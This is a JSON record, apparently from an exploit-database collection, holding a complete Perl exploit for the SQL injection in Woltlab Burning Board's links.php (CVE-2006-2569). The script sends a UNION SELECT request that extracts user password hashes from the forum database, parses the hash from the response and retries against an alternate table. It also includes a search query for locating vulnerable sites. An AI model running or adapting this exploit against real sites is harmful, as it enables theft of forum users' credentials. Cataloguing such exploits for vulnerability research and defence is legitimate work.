{
  "id": "1810",
  "title": "Woltlab Burning Board 2.3.5 - &#039;links.php&#039; SQL Injection",
  "cve": "CVE-2006-2569",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\nprint q{\r\n################################################################################\r\n##                                                                            ##\r\n##  Woltlab Burning Board 2.3.4 <= \"links.php\" SQL Injection Exploit          ##\r\n##  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -       ##\r\n##  Exploit by       |  666 (SR-Crew)                                         ##\r\n##  Bug by           |  x82                                                   ##\r\n##  Googledork       |  inurl:/wbb2/links.php?cat                             ##\r\n##  Usage            |  links.pl [server] [path]                              ##\r\n##  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -       ##\r\n##                                                                            ##\r\n################################################################################\r\n\r\n};\r\n\r\n$webpage = $ARGV[0];\r\n$directory = $ARGV[1];\r\n\r\nif (!$webpage||!$directory) { die \"[+] Exploit failed\\n\"; }\r\n\r\n$wbb_dir = \r\n\"http://\".$webpage.$directory.\"links.php?cat=31337+union+select+password,userid+from+bb1_users\";\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$webpage\", \r\nPeerPort=>\"80\") || die \"[+] Can't connect to Server\\n\";\r\nprint \"[+] Exploiting....\\n\";\r\nprint $sock \"GET $wbb_dir HTTP/1.1\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"User-Agent: Hacker\\n\";\r\nprint $sock \"Host: $webpage\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\n\r\nwhile ($answer = <$sock>) {\r\n\tif ($answer =~ \r\n/(................................)<\\/span><\\/b><\\/font>/) {\r\n\t\tprint \"[+] Hash: $1\\n\";\r\n\t\texit();\r\n\t}\r\n\tif ($answer =~ /SQL-DATABASE ERROR/) {\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n$wbb_dir = \r\n\"http://\".$webpage.$directory.\"links.php?cat=31337+union+select+password,userid+from+bb1_users\";\r\nclose($sock);\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$webpage\", \r\nPeerPort=>\"80\") || die \"[+] Can't connect to Server\\n\";\r\nprint $sock \"GET $wbb_dir HTTP/1.1\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"User-Agent: Hacker\\n\";\r\nprint $sock \"Host: $webpage\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\n\r\nwhile ($answer = <$sock>) {\r\n\tif ($answer =~ \r\n/(................................)<\\/span><\\/b><\\/font>/) {\r\n\t\tprint \"[+] Hash: $1\\n\";\r\n\t\texit();\r\n\t}\r\n\tif ($answer =~ /SQL-DATABASE ERROR/) {\r\n\t\tprint \"[+] Try replacing bb1_users with bb2_users\\n\";\r\n\t\tbreak;\r\n\t}\r\n}\r\nclose($sock);\r\n\r\nprint \"[+] Exploit failed\\n\";\r\n\r\n# milw0rm.com [2006-05-20]",
  "url": "https://www.exploit-db.com/exploits/1810"
}